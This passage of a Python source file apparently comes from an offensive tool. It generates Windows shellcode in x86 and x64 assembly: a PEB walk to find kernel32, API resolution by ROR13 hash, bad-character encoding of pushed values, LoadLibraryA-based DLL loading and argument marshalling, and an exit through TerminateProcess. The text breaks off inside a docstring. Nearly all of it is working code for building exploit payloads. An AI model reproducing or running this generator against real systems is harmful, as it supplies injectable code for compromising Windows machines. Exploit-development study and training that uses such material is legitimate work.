"""
Windows Code Generator

Handles generation of Windows shellgen with:
- PEB walk for kernel32.dll resolution
- Reusable find_function subroutine via hash lookup
- Bad character encoding
- LoadLibraryA for external DLLs

Supports: x86, x64, ARM, ARM64
"""

import sys
from collections import OrderedDict

from lib.color_printer import printer

from ..encoders import encode_dword, ror13_hash, string_to_push_dwords


class WindowsGenerator:
    """Generator for Windows shellgen (x86, x64, ARM, ARM64)"""

    def __init__(self, bad_chars, arch="x86"):
        """
        Initialize the generator.

        Args:
            bad_chars: Set of bad character bytes to avoid
            arch: Target architecture ('x86', 'x64', 'arm', 'arm64')
        """
        self.bad_chars = set(bad_chars)
        self.arch = arch.lower()

        # Validate architecture
        if self.arch not in ["x86", "x64", "arm", "arm64"]:
            raise ValueError(f"Unsupported Windows architecture: {self.arch}")

    def gen_push_encoded_dword(self, dword, reg="eax", comment=""):
        """Generate assembly to push a dword, encoding if it contains bad chars."""
        lines = []
        result = encode_dword(dword, self.bad_chars)

        if result is None:
            # No encoding needed
            lines.append(f"    push 0x{dword:08x}          ; {comment}")
        elif isinstance(result, tuple) and len(result) == 3 and result[0] == "ADD":
            # Addition encoding: val1 + val2 = target
            _, val1, val2 = result
            lines.append(f"    ; Encoded push via ADD: 0x{dword:08x} {comment}")
            lines.append(f"    mov {reg}, 0x{val1:08x}")
            lines.append(f"    add {reg}, 0x{val2:08x}")
            lines.append(f"    push {reg}")
        else:
            # Subtraction encoding: clean - offset = target
            clean, offset = result
            lines.append(f"    ; Encoded push via SUB: 0x{dword:08x} {comment}")
            lines.append(f"    mov {reg}, 0x{clean:08x}")
            lines.append(f"    sub {reg}, 0x{offset:08x}")
            lines.append(f"    push {reg}")

        return "\n".join(lines)

    def gen_push_string(self, s, label=None):
        """Generate assembly to push a null-terminated string onto the stack."""
        lines = []
        dwords = string_to_push_dwords(s)

        lines.append(f'    ; Push string: "{s}"')

        # Architecture-specific registers
        if self.arch == "x64":
            ptr_reg = "rcx"
            sp_reg = "rsp"
            scratch_reg = "rax"
        else:
            ptr_reg = "ecx"
            sp_reg = "esp"
            scratch_reg = "eax"

        # Push in reverse order so the string is laid out correctly in memory
        for _i, dword in enumerate(reversed(dwords)):
            if dword == 0x00000000:
                lines.append(f"    xor {scratch_reg}, {scratch_reg}")
                lines.append(f"    push {scratch_reg}               ; null terminator")
            else:
                lines.append(
                    self.gen_push_encoded_dword(
                        dword, reg=scratch_reg, comment=f'part of "{s[:20]}..."'
                    )
                )

        lines.append(
            f"    mov {ptr_reg}, {sp_reg}            ; {ptr_reg} -> string on stack"
        )
        if label:
            lines.append(f"    mov {label}, {ptr_reg}        ; save pointer for reuse")
        return "\n".join(lines)

    def gen_boilerplate(self):
        """Generate the reusable PEB walk + find_function subroutine (dispatches by arch)."""
        if self.arch == "x64":
            return self.gen_boilerplate_x64()
        else:
            return self.gen_boilerplate_x86()

    def gen_boilerplate_x86(self):
        """Generate x86 PEB walk + find_function subroutine."""
        return """; ==========================================================================
; Setup stack frame and find kernel32.dll (x86)
; ==========================================================================
start:
    mov ebp, esp                ; Set up stack frame
    add esp, 0xfffff9f0         ; Allocate space (avoids NULL bytes: -0x610)

find_kernel32:
    xor ecx, ecx                ; Zero ECX
    mov esi, fs:[ecx+0x30]      ; ESI = pointer to PEB
    mov esi, [esi+0x0C]         ; ESI = PEB->Ldr
    mov esi, [esi+0x1C]         ; ESI = PEB->Ldr.InInitOrder

next_module:
    mov ebx, [esi+0x08]         ; EBX = current module base address
    mov edi, [esi+0x20]         ; EDI = current module name (unicode)
    mov esi, [esi]              ; ESI = next module (Flink)
    cmp word ptr [edi+12 * 2], cx ; Check if position 12 == 0x00 (kernel32 = 12 chars)
    jne next_module             ; Repeat if not found

; ==========================================================================
; Reusable find_function subroutine (callable via [ebp+0x04])
; ==========================================================================
find_function_shorten:
    jmp find_function_shorten_bnc

find_function_ret:
    pop esi                     ; POP return address from stack
    mov [ebp+0x04], esi         ; Save find_function address at [ebp+0x04]
    jmp resolve_symbols_kernel32

find_function_shorten_bnc:
    call find_function_ret      ; CALL with negative offset

find_function:
    pushad                      ; Save all registers
                                ; EBX = kernel32 base from previous step
    mov eax, [ebx+0x3C]         ; Offset to PE signature
    mov edi, [ebx+eax+0x78]     ; Export Table RVA
    add edi, ebx                ; Export Table VA
    mov ecx, [edi+0x18]         ; NumberOfNames
    mov eax, [edi+0x20]         ; AddressOfNames RVA
    add eax, ebx                ; AddressOfNames VA
    mov [ebp-4], eax            ; Save AddressOfNames VA

find_function_loop:
    jecxz find_function_finished
    dec ecx
    mov eax, [ebp-4]            ; Restore AddressOfNames VA
    mov esi, [eax+ecx * 4]        ; Get RVA of symbol name
    add esi, ebx                ; Get VA of symbol name

compute_hash:
    xor eax, eax                ; NULL EAX
    cdq                         ; NULL EDX
    cld                         ; Clear direction flag

compute_hash_again:
    lodsb                       ; Load next byte from ESI into AL
    test al, al                 ; Check for NULL terminator
    jz compute_hash_finished
    push ecx                    ; Save ECX
    xor ecx, ecx                ; Zero ECX
    mov cl, 15                  ; CL = 15
    sub cl, 2                   ; CL = 13 (avoids 0x0D literal)
    ror edx, cl                 ; Rotate EDX by CL bits right
    pop ecx                     ; Restore ECX
    add edx, eax                ; Add byte to accumulator
    jmp compute_hash_again

compute_hash_finished:

find_function_compare:
    cmp edx, [esp+0x24]         ; Compare hash with requested hash (from push before call)
    jnz find_function_loop      ; Continue if no match
    mov edx, [edi+0x24]         ; AddressOfNameOrdinals RVA
    add edx, ebx                ; AddressOfNameOrdinals VA
    mov cx, [edx+2*ecx]         ; Get function ordinal
    mov edx, [edi+0x1C]         ; AddressOfFunctions RVA
    add edx, ebx                ; AddressOfFunctions VA
    mov eax, [edx+4*ecx]        ; Get function RVA
    add eax, ebx                ; Get function VA
    mov [esp+0x1C], eax         ; Overwrite saved EAX in pushad

find_function_finished:
    popad                       ; Restore registers (EAX now contains function address)
    ret

; ==========================================================================
; Resolve essential kernel32.dll functions
; ==========================================================================
resolve_symbols_kernel32:
    mov [ebp+0x10], ebx         ; Save kernel32.dll base at [ebp+0x10]
    push 0xec0e4e8e             ; LoadLibraryA hash
    call dword ptr [ebp+0x04]   ; Call find_function
    mov [ebp+0x08], eax         ; Save LoadLibraryA at [ebp+0x08]
"""

    def gen_boilerplate_x64(self):
        """Generate x64 PEB walk + find_function subroutine."""
        return """; ==========================================================================
; Setup stack frame and find kernel32.dll/kernelbase.dll (x64)
; ==========================================================================
start:
    mov rbp, rsp                ; Set up stack frame
    sub rsp, 0x100              ; Allocate stack space

find_kernelbase:
    mov rcx, 0x60               ; RCX = 0x60
    mov r8, gs:[rcx]            ; R8 = ptr to PEB ([GS:0x60])
    mov rdi, [r8 + 0x18]        ; RDI = PEB->Ldr
    mov rdi, [rdi + 0x30]       ; RDI = PEB->Ldr->InLoadInitOrder
    xor rcx, rcx                ; RCX = 0
    mov dl, 0x4b                ; DL = "K" (for kernel32/kernelbase)

next_module:
    mov rax, [rdi + 0x10]       ; RAX = InInitOrder[X].base_address
    mov rsi, [rdi + 0x40]       ; RSI = InInitOrder[X].module_name
    mov rdi, [rdi]              ; RDI = InInitOrder[X].flink (next)
    cmp [rsi + 12 * 2], cx        ; (unicode) modulename[12] == 0x00 ?
    jne next_module             ; No: try next module
    cmp [rsi], dl               ; modulename starts with "K"?
    jne next_module             ; No: try next module

; ==========================================================================
; Reusable find_function subroutine (callable via [rbp+0x08])
; Input: RDI = module base, EDX = function hash
; Output: RAX = function address
; ==========================================================================
lookup_func:
    push rbx                    ; Save RBX
    push rcx                    ; Save RCX
    push rsi                    ; Save RSI
    push r8                     ; Save R8
    push r9                     ; Save R9

    mov ebx, [rdi + 0x3c]       ; Offset to PE Signature
    add rbx, 0x88               ; Export table relative offset
    add rbx, rdi                ; Export table VMA
    mov eax, [rbx]              ; Export directory relative offset
    mov rbx, rdi
    add rbx, rax                ; Export directory VMA
    mov eax, [rbx + 0x20]       ; AddressOfNames relative offset
    mov r8, rdi
    add r8, rax                 ; AddressOfNames VMA
    mov ecx, [rbx + 0x18]       ; NumberOfNames

check_names:
    jecxz found_func            ; End of exported list
    dec ecx                     ; Search backwards through exported functions
    mov eax, [r8 + rcx * 4]     ; Store relative offset of the name
    mov rsi, rdi
    add rsi, rax                ; RSI = VMA of current name
    xor r9, r9                  ; R9 = 0
    xor rax, rax                ; RAX = 0
    cld                         ; Clear direction

calc_hash:
    lodsb                       ; Load next byte from RSI into AL
    test al, al                 ; Test for null terminator
    jz calc_finished            ; If ZF is set, we've hit null term
    ror r9d, 0x0d               ; Rotate R9D 13 bits to the right
    add r9, rax                 ; Add the new byte to accumulator
    jmp calc_hash               ; Next iteration

calc_finished:
    cmp r9d, edx                ; Compare computed hash with requested hash
    jnz check_names             ; No match, try the next one

find_addr:
    mov r8d, [rbx + 0x24]       ; Ordinals table relative offset
    add r8, rdi                 ; Ordinals table VMA
    xor rax, rax                ; RAX = 0
    mov ax, [r8 + rcx * 2]      ; Extrapolate function's ordinal
    mov r8d, [rbx + 0x1c]       ; Address table relative offset
    add r8, rdi                 ; Address table VMA
    mov eax, [r8 + rax * 4]     ; Extract relative function offset
    add rax, rdi                ; Function VMA

found_func:
    pop r9                      ; Restore R9
    pop r8                      ; Restore R8
    pop rsi                     ; Restore RSI
    pop rcx                     ; Restore RCX
    pop rbx                     ; Restore RBX
    ret

; ==========================================================================
; Setup find_function address (now uses backward reference)
; ==========================================================================
locate_funcs:
    lea r15, [rip + lookup_func]  ; R15 = address of lookup_func (RIP-relative)
    mov [rbp + 0x08], r15       ; Save lookup_func at [rbp+0x08]
    mov [rbp + 0x20], rax       ; Save kernel32/kernelbase base at [rbp+0x20]
    jmp resolve_symbols_kernel32

; ==========================================================================
; Resolve essential kernel32.dll functions
; ==========================================================================
resolve_symbols_kernel32:
    mov rdi, [rbp + 0x20]       ; RDI = kernel32/kernelbase base
    mov edx, 0xec0e4e8e         ; LoadLibraryA hash
    call qword ptr [rbp + 0x08] ; Call lookup_func
    mov [rbp + 0x10], rax       ; Save LoadLibraryA at [rbp+0x10]
"""

    def gen_load_dll(self, dll_name, ebp_offset):
        """Generate code to load a DLL and save its base at [rbp/ebp+offset]."""
        if self.arch == "x64":
            return self.gen_load_dll_x64(dll_name, ebp_offset)
        else:
            return self.gen_load_dll_x86(dll_name, ebp_offset)

    def gen_load_dll_x86(self, dll_name, ebp_offset):
        """Generate x86 code to load a DLL and save its base at [ebp+offset]."""
        lines = []
        lines.append(
            "\n; =========================================================================="
        )
        lines.append(f"; Load {dll_name}")
        lines.append(
            "; =========================================================================="
        )

        # Push DLL name onto stack
        dll_dwords = string_to_push_dwords(dll_name)
        lines.append("    xor eax, eax")
        lines.append("    push eax                ; NULL terminator")
        for dw in reversed(dll_dwords):
            if dw != 0:
                lines.append(
                    self.gen_push_encoded_dword(dw, comment=f'part of "{dll_name}"')
                )

        # Get pointer to the string (after all pushes)
        lines.append("    mov ecx, esp            ; ECX = pointer to DLL name")
        lines.append("    push ecx                ; Push pointer as argument")
        lines.append("    call dword ptr [ebp+0x08]  ; Call LoadLibraryA")
        lines.append(f"    mov [ebp+{ebp_offset}], eax  ; Save {dll_name} base")

        return "\n".join(lines)

    def gen_load_dll_x64(self, dll_name, rbp_offset):
        """Generate x64 code to load a DLL and save its base at [rbp+offset]."""
        lines = []
        lines.append(
            "\n; =========================================================================="
        )
        lines.append(f"; Load {dll_name}")
        lines.append(
            "; =========================================================================="
        )

        # Push DLL name onto stack (still need to build string)
        dll_dwords = string_to_push_dwords(dll_name)
        lines.append("    xor rax, rax")
        lines.append("    push rax                ; NULL terminator")
        for dw in reversed(dll_dwords):
            if dw != 0:
                lines.append(
                    self.gen_push_encoded_dword(dw, comment=f'part of "{dll_name}"')
                )

        # x64 calling convention: RCX = first argument
        lines.append("    mov rcx, rsp            ; RCX = pointer to DLL name")
        lines.append("    sub rsp, 0x20           ; Shadow space (32 bytes)")
        lines.append("    call qword ptr [rbp+0x10]  ; Call LoadLibraryA")
        lines.append("    add rsp, 0x20           ; Clean up shadow space")
        lines.append(f"    mov [rbp+{rbp_offset}], rax  ; Save {dll_name} base")

        return "\n".join(lines)

    def gen_resolve_function(self, api_name, dll_base_location, save_location):
        """Generate code to resolve a function by hash (dispatches by arch)."""
        if self.arch == "x64":
            return self.gen_resolve_function_x64(
                api_name, dll_base_location, save_location
            )
        else:
            return self.gen_resolve_function_x86(
                api_name, dll_base_location, save_location
            )

    def gen_resolve_function_x86(self, api_name, dll_base_location, save_location):
        """
        Generate x86 code to resolve a function by hash.

        Args:
            api_name: Function name (e.g., "WinExec")
            dll_base_location: Where the DLL base is stored (e.g., "ebx" or "[ebp+0x0C]")
            save_location: Where to save the function pointer (e.g., "[ebp+0x10]")
        """
        lines = []
        api_hash = ror13_hash(api_name)

        # If dll_base is in memory, load it to EBX
        if dll_base_location.startswith("["):
            lines.append(f"    mov ebx, {dll_base_location}  ; Load DLL base to EBX")

        lines.append(f"    push 0x{api_hash:08x}       ; {api_name} hash")
        lines.append("    call dword ptr [ebp+0x04]   ; Call find_function")
        lines.append(f"    mov {save_location}, eax    ; Save {api_name}")

        return "\n".join(lines)

    def gen_resolve_function_x64(self, api_name, dll_base_location, save_location):
        """
        Generate x64 code to resolve a function by hash.

        Args:
            api_name: Function name (e.g., "WinExec")
            dll_base_location: Where the DLL base is stored (e.g., "rdi" or "[rbp+0x30]")
            save_location: Where to save the function pointer (e.g., "[rbp+0x40]")
        """
        lines = []
        api_hash = ror13_hash(api_name)

        # If dll_base is in memory, load it to RDI
        if dll_base_location.startswith("["):
            lines.append(f"    mov rdi, {dll_base_location}  ; Load DLL base to RDI")

        lines.append(f"    mov edx, 0x{api_hash:08x}       ; {api_name} hash")
        lines.append("    call qword ptr [rbp+0x08]   ; Call lookup_func")
        lines.append(f"    mov {save_location}, rax    ; Save {api_name}")

        return "\n".join(lines)

    def gen_exit_shellcode(self, api_to_offset):
        """Generate clean exit via TerminateProcess (dispatches by arch)."""
        if self.arch == "x64":
            return self.gen_exit_shellcode_x64(api_to_offset)
        else:
            return self.gen_exit_shellcode_x86(api_to_offset)

    def gen_exit_shellcode_x86(self, api_to_offset):
        """
        Generate x86 clean exit via TerminateProcess using pre-resolved functions.

        Args:
            api_to_offset: Dict mapping API names to their EBP offsets
        """
        lines = []
        lines.append(
            "\n; =========================================================================="
        )
        lines.append("; Clean exit via TerminateProcess(GetCurrentProcess(), 0)")
        lines.append(
            "; =========================================================================="
        )

        # Get offsets for pre-resolved functions
        get_current_process_offset = api_to_offset.get("GetCurrentProcess")
        terminate_process_offset = api_to_offset.get("TerminateProcess")

        if not get_current_process_offset or not terminate_process_offset:
            raise ValueError(
                "Exit APIs not pre-resolved! GetCurrentProcess and TerminateProcess must be included in api_to_offset"
            )

        # Call pre-resolved GetCurrentProcess
        lines.append(
            f"    call dword ptr [ebp+0x{get_current_process_offset:02x}]  ; Call GetCurrentProcess"
        )
        lines.append("    mov edi, eax          ; Save hProcess in EDI")

        # Call TerminateProcess(hProcess, 0)
        lines.append("    xor ecx, ecx")
        lines.append("    push ecx              ; exit code = 0")
        lines.append("    push edi              ; hProcess")
        lines.append(
            f"    call dword ptr [ebp+0x{terminate_process_offset:02x}]  ; Call TerminateProcess"
        )

        return "\n".join(lines)

    def gen_exit_shellcode_x64(self, api_to_offset):
        """
        Generate x64 clean exit via TerminateProcess using pre-resolved functions.

        Args:
            api_to_offset: Dict mapping API names to their RBP offsets
        """
        lines = []
        lines.append(
            "\n; =========================================================================="
        )
        lines.append("; Clean exit via TerminateProcess(GetCurrentProcess(), 0) - x64")
        lines.append(
            "; =========================================================================="
        )

        # Get offsets for pre-resolved functions
        get_current_process_offset = api_to_offset.get("GetCurrentProcess")
        terminate_process_offset = api_to_offset.get("TerminateProcess")

        if not get_current_process_offset or not terminate_process_offset:
            raise ValueError(
                "Exit APIs not pre-resolved! GetCurrentProcess and TerminateProcess must be included in api_to_offset"
            )

        # Call pre-resolved GetCurrentProcess (no arguments)
        lines.append("    sub rsp, 0x20         ; Shadow space")
        lines.append(
            f"    call qword ptr [rbp+0x{get_current_process_offset:02x}]  ; Call GetCurrentProcess"
        )
        lines.append("    add rsp, 0x20         ; Clean up shadow space")
        lines.append("    mov r15, rax          ; Save hProcess in R15")

        # Call TerminateProcess(hProcess, 0)
        # x64 fastcall: RCX = hProcess, RDX = exit code
        lines.append("    mov rcx, r15          ; RCX = hProcess")
        lines.append("    xor rdx, rdx          ; RDX = exit code = 0")
        lines.append("    sub rsp, 0x20         ; Shadow space")
        lines.append(
            f"    call qword ptr [rbp+0x{terminate_process_offset:02x}]  ; Call TerminateProcess"
        )
        lines.append("    add rsp, 0x20         ; Clean up shadow space")

        return "\n".join(lines)

    @staticmethod
    def consolidate_strings(calls):
        """
        Analyze all API calls and identify strings that are reused.

        Returns: (updated_calls, string_cache)
        """
        # Count string usage
        string_usage = {}
        for call in calls:
            for arg in call["args"]:
                if (
                    isinstance(arg, str)
                    and not arg.startswith("REG:")
                    and not arg.startswith("STR_PTR:")
                    and not arg.startswith("MEM:")
                ):
                    string_usage[arg] = string_usage.get(arg, 0) + 1

        # Identify strings used more than once
        reused_strings = {
            s: f"[ebp-{(i + 1) * 4}]"
            for i, (s, count) in enumerate(string_usage.items())
            if count > 1
        }

        # Update calls to reference cached strings
        updated_calls = []
        for call in calls:
            updated_args = []
            for arg in call["args"]:
                if isinstance(arg, str) and arg in reused_strings:
                    updated_args.append(f"STR_PTR:{arg}")
                else:
                    updated_args.append(arg)
            updated_call = call.copy()
            updated_call["args"] = updated_args
            updated_calls.append(updated_call)

        return updated_calls, reused_strings

    def _group_apis_by_dll(self, calls, include_exit_apis):
        """Group API calls by DLL, preserving order and deduplicating.

        Returns:
            OrderedDict: Maps dll_name -> list of api_names
        """
        dll_to_apis = OrderedDict()

        for call in calls:
            if call.get("custom_asm"):
                continue

            dll_name = call.get("dll", "kernel32.dll").lower()
            api_name = call["api"]

            if dll_name not in dll_to_apis:
                dll_to_apis[dll_name] = []

            if api_name not in dll_to_apis[dll_name]:
                dll_to_apis[dll_name].append(api_name)

        if include_exit_apis:
            if "kernel32.dll" not in dll_to_apis:
                dll_to_apis["kernel32.dll"] = []
            for api in ("GetCurrentProcess", "TerminateProcess"):
                if api not in dll_to_apis["kernel32.dll"]:
                    dll_to_apis["kernel32.dll"].append(api)

        return dll_to_apis

    def _resolve_apis_for_dll(self, api_list, base_ref, current_offset):
        """Resolve all APIs from a single DLL base.

        Returns:
            tuple: (lines, api_to_offset, new_current_offset)
        """
        ptr_size = 8 if self.arch == "x64" else 4
        bp = "rbp" if self.arch == "x64" else "ebp"
        lines = []
        api_to_offset = {}

        for api_name in api_list:
            lines.append(
                self.gen_resolve_function(
                    api_name, base_ref, f"[{bp}+0x{current_offset:02x}]"
                )
            )
            api_to_offset[api_name] = current_offset
            current_offset += ptr_size

        return lines, api_to_offset, current_offset

    def gen_pre_resolve_apis(self, calls, include_exit_apis=False):
        """
        Generate code to pre-resolve all APIs upfront and store in [ebp+offset].

        Args:
            calls: List of API call configurations
            include_exit_apis: If True, also pre-resolve GetCurrentProcess and TerminateProcess

        Returns:
            tuple: (assembly_code, api_to_offset_map)
        """
        lines = []
        lines.append(
            "\n; =========================================================================="
        )
        lines.append("; Pre-resolve all APIs upfront")
        lines.append(
            "; =========================================================================="
        )

        api_to_offset = {}
        current_offset = 0x14
        loaded_dlls = {}
        ptr_size = 8 if self.arch == "x64" else 4
        bp = "rbp" if self.arch == "x64" else "ebp"

        dll_to_apis = self._group_apis_by_dll(calls, include_exit_apis)

        # Resolve kernel32 APIs first (base already loaded in boilerplate)
        if "kernel32.dll" in dll_to_apis:
            if self.arch == "x64":
                base_ref = "[rbp+0x20]"
                lines.append(
                    "\n; Resolve kernel32.dll APIs (kernel32/kernelbase base at [rbp+0x20])"
                )
            else:
                base_ref = "ebx"
                lines.append(
                    "\n; Resolve kernel32.dll APIs (EBX already contains kernel32 base)"
                )

            dll_lines, dll_offsets, current_offset = self._resolve_apis_for_dll(
                dll_to_apis["kernel32.dll"], base_ref, current_offset
            )
            lines.extend(dll_lines)
            api_to_offset.update(dll_offsets)

        # Load external DLLs and resolve their APIs
        for dll_name, api_list in dll_to_apis.items():
            if dll_name == "kernel32.dll":
                continue

            dll_base_offset = (0x30 if self.arch == "x64" else 0x0C) + len(
                loaded_dlls
            ) * ptr_size
            lines.append(self.gen_load_dll(dll_name, f"0x{dll_base_offset:02x}"))
            loaded_dlls[dll_name] = dll_base_offset

            base_ref = f"[{bp}+0x{dll_base_offset:02x}]"
            dll_lines, dll_offsets, current_offset = self._resolve_apis_for_dll(
                api_list, base_ref, current_offset
            )
            lines.extend(dll_lines)
            api_to_offset.update(dll_offsets)

        return "\n".join(lines), api_to_offset

    def gen_api_call_preresolve(self, api_name, args, api_offset, string_cache):
        """Generate assembly for calling a pre-resolved API (dispatches by arch)."""
        if self.arch == "x64":
            return self.gen_api_call_preresolve_x64(
                api_name, args, api_offset, string_cache
            )
        else:
            return self.gen_api_call_preresolve_x86(
                api_name, args, api_offset, string_cache
            )

    def _prepare_x86_string_args(self, args, api_name):
        """Pre-resolve plain string arguments into callee-saved registers (x86).

        Returns:
            tuple: (lines, string_to_reg)
        """
        string_registers = ["edi", "esi", "edx"]
        string_to_reg = {}
        lines = [f"\n; Prepare string arguments for {api_name}"]
        reg_idx = 0

        for i, arg in enumerate(args):
            if (
                isinstance(arg, str)
                and not arg.startswith("STR_PTR:")
                and not arg.startswith("REG:")
                and not arg.startswith("MEM:")
            ):
                lines.append(self.gen_push_string(arg))
                if reg_idx < len(string_registers):
                    reg = string_registers[reg_idx]
                    lines.append(
                        f'    mov {reg}, ecx         ; save pointer to "{arg[:20]}..."'
                    )
                    string_to_reg[i] = reg
                    reg_idx += 1
                else:
                    string_to_reg[i] = "ecx"

        return lines, string_to_reg

    @staticmethod
    def _get_reg_refs(args):
        """Collect register names referenced by REG: args (lowercased)."""
        refs = set()
        for a in args:
            if isinstance(a, str) and a.startswith("REG:"):
                refs.add(a.split(":")[1].lower())
        return refs

    @staticmethod
    def _safe_zero_reg(preferred, candidates, reg_refs):
        """Pick a scratch register for xor-zeroing that won't clobber REG: refs."""
        if not reg_refs or preferred not in reg_refs:
            return preferred
        for c in candidates:
            if c not in reg_refs:
                return c
        return preferred  # fallback — all candidates referenced

    def _push_x86_arg(
        self, arg, original_idx, string_cache, string_to_reg, reg_refs=None
    ):
        """Push a single x86 stdcall argument onto the stack.

        Args:
            reg_refs: Set of register names used by REG: args in this call.
                      Used to avoid clobbering registers when pushing zero.

        Returns:
            list: Assembly lines
        """
        lines = []
        if isinstance(arg, int):
            if arg == 0:
                zr = self._safe_zero_reg("eax", ["ecx", "edx"], reg_refs)
                lines.append(f"    xor {zr}, {zr}")
                lines.append(f"    push {zr}               ; arg = 0")
            else:
                lines.append(
                    self.gen_push_encoded_dword(arg, comment=f"arg = 0x{arg:x}")
                )
        elif isinstance(arg, str) and arg.startswith("STR_PTR:"):
            string_val = arg[8:]
            if string_val in string_cache:
                cached_reg = string_cache[string_val]
                lines.append(f"    push {cached_reg}          ; reused string pointer")
            else:
                lines.append(self.gen_push_string(string_val))
                lines.append("    push ecx               ; pointer to string arg")
        elif isinstance(arg, str) and arg.startswith("MEM:"):
            mem_ref = arg[4:]
            lines.append(f"    push {mem_ref}          ; arg from memory")
        elif isinstance(arg, str) and arg.startswith("REG:"):
            reg = arg.split(":")[1]
            lines.append(f"    push {reg}              ; arg from register")
        elif isinstance(arg, str):
            if original_idx in string_to_reg:
                reg = string_to_reg[original_idx]
                lines.append(f"    push {reg}               ; pointer to string arg")
            else:
                lines.append(self.gen_push_string(arg))
                lines.append("    push ecx               ; pointer to string arg")
        return lines

    def gen_api_call_preresolve_x86(self, api_name, args, api_offset, string_cache):
        """
        Generate x86 assembly for calling a pre-resolved API.

        Args:
            api_name: API function name
            args: List of arguments
            api_offset: Offset where API pointer is stored [ebp+offset]
            string_cache: Dict of cached string pointers

        Returns:
            str: Assembly code
        """
        reg_refs = self._get_reg_refs(args)

        # If any arg references EAX (return value from previous call),
        # save it before string preparation clobbers it
        save_reg = None
        if "eax" in reg_refs:
            # Check if string prep will actually run (has plain string args)
            has_strings = any(
                isinstance(a, str)
                and not a.startswith(("STR_PTR:", "REG:", "MEM:"))
                for a in args
            )
            if has_strings:
                save_reg = "ebx"
                # Rewrite REG:eax -> REG:ebx in a copy of args
                args = [
                    f"REG:{save_reg}" if (isinstance(a, str) and a == "REG:eax")
                    else a
                    for a in args
                ]
                reg_refs = self._get_reg_refs(args)

        lines = []
        if save_reg:
            lines.append(
                f"    mov {save_reg}, eax"
                f"            ; save return value for {api_name}"
            )

        prep_lines, string_to_reg = self._prepare_x86_string_args(args, api_name)
        lines.extend(prep_lines)

        # Push arguments right-to-left (stdcall)
        lines.append(f"\n; Push arguments for {api_name} (right to left)")

        for i, arg in enumerate(reversed(args)):
            original_idx = len(args) - 1 - i
            lines.extend(
                self._push_x86_arg(
                    arg, original_idx, string_cache, string_to_reg, reg_refs
                )
            )

        lines.append(f"    call dword ptr [ebp+0x{api_offset:02x}]  ; Call {api_name}")
        return "\n".join(lines)

    def _prepare_x64_string_args(self, args, api_name):
        """Pre-resolve plain string arguments into callee-saved registers (x64).

        Returns:
            tuple: (lines, string_to_reg) where string_to_reg maps arg index to register/memory ref
        """
        string_registers = ["r12", "r13", "r14", "r15"]
        string_to_reg = {}
        lines = [f"\n; Prepare string arguments for {api_name} - x64"]
        reg_idx = 0

        for i, arg in enumerate(args):
            if (
                isinstance(arg, str)
                and not arg.startswith("STR_PTR:")
                and not arg.startswith("REG:")
                and not arg.startswith("MEM:")
            ):
                lines.append(self.gen_push_string(arg))
                if reg_idx < len(string_registers):
                    reg = string_registers[reg_idx]
                    lines.append(
                        f'    mov {reg}, rcx         ; save pointer to "{arg[:20]}..."'
                    )
                    string_to_reg[i] = reg
                    reg_idx += 1
                else:
                    lines.append(
                        "    push rcx               ; save string pointer on stack"
                    )
                    string_to_reg[i] = f"[rsp+{(reg_idx - len(string_registers)) * 8}]"

        return lines, string_to_reg

    def _resolve_x64_reg_arg(
        self, arg, i, reg, string_cache, string_to_reg, reg_refs=None
    ):
        """Resolve a single argument into a fastcall register (args 1-4).

        Returns:
            list: Assembly lines for loading the argument into reg
        """
        lines = []
        if isinstance(arg, int):
            if arg == 0:
                lines.append(f"    xor {reg}, {reg}         ; arg {i + 1} = 0")
            else:
                lines.append(f"    mov {reg}, 0x{arg:x}    ; arg {i + 1} = 0x{arg:x}")
        elif isinstance(arg, str) and arg.startswith("STR_PTR:"):
            string_val = arg[8:]
            if string_val in string_cache:
                cached_reg = string_cache[string_val]
                lines.append(
                    f"    mov {reg}, {cached_reg}  ; arg {i + 1} = cached string pointer"
                )
            else:
                lines.append(self.gen_push_string(string_val))
                lines.append(
                    f"    mov {reg}, rcx           ; arg {i + 1} = string pointer"
                )
        elif isinstance(arg, str) and arg.startswith("MEM:"):
            mem_ref = arg[4:]
            lines.append(f"    mov {reg}, {mem_ref}     ; arg {i + 1} from memory")
        elif isinstance(arg, str) and arg.startswith("REG:"):
            src_reg = arg.split(":")[1]
            if src_reg != reg:
                lines.append(
                    f"    mov {reg}, {src_reg}     ; arg {i + 1} from register"
                )
        elif isinstance(arg, str):
            if i in string_to_reg:
                src_reg = string_to_reg[i]
                suffix = " from stack" if src_reg.startswith("[") else ""
                lines.append(
                    f"    mov {reg}, {src_reg}     ; arg {i + 1} = string pointer{suffix}"
                )
            else:
                lines.append(self.gen_push_string(arg))
                lines.append(
                    f"    mov {reg}, rcx           ; arg {i + 1} = string pointer"
                )
        return lines

    def _push_x64_stack_arg(
        self, arg, i, string_cache, string_to_reg, reg_refs=None
    ):
        """Push a single stack argument for x64 fastcall (args 5+).

        Returns:
            list: Assembly lines for pushing the argument
        """
        lines = []
        if isinstance(arg, int):
            if arg == 0:
                zr = self._safe_zero_reg("rax", ["r10", "r11"], reg_refs)
                lines.append(f"    xor {zr}, {zr}")
                lines.append(f"    push {zr}               ; arg {i + 1} = 0")
            else:
                lines.append(
                    self.gen_push_encoded_dword(arg, comment=f"arg {i + 1} = 0x{arg:x}")
                )
        elif isinstance(arg, str) and arg.startswith("STR_PTR:"):
            string_val = arg[8:]
            if string_val in string_cache:
                cached_reg = string_cache[string_val]
                lines.append(
                    f"    push {cached_reg}          ; arg {i + 1} = cached string"
                )
            else:
                lines.append(self.gen_push_string(string_val))
                lines.append(
                    f"    push rcx               ; arg {i + 1} = string pointer"
                )
        elif isinstance(arg, str) and arg.startswith("MEM:"):
            mem_ref = arg[4:]
            lines.append(f"    push {mem_ref}          ; arg {i + 1} from memory")
        elif isinstance(arg, str) and arg.startswith("REG:"):
            src_reg = arg.split(":")[1]
            lines.append(f"    push {src_reg}          ; arg {i + 1} from register")
        elif isinstance(arg, str):
            if i in string_to_reg:
                src_reg = string_to_reg[i]
                if src_reg.startswith("["):
                    lines.append(f"    mov rax, {src_reg}")
                    lines.append(
                        f"    push rax               ; arg {i + 1} = string pointer"
                    )
                else:
                    lines.append(
                        f"    push {src_reg}         ; arg {i + 1} = string pointer"
                    )
            else:
                lines.append(self.gen_push_string(arg))
                lines.append(
                    f"    push rcx               ; arg {i + 1} = string pointer"
                )
        return lines

    def gen_api_call_preresolve_x64(self, api_name, args, api_offset, string_cache):
        """
        Generate x64 assembly for calling a pre-resolved API using fastcall convention.

        x64 fastcall convention:
        - First 4 args: RCX, RDX, R8, R9
        - Remaining args: pushed on stack right-to-left
        - 32 bytes shadow space required
        - Caller cleans up stack

        Args:
            api_name: API function name
            args: List of arguments
            api_offset: Offset where API pointer is stored [rbp+offset]
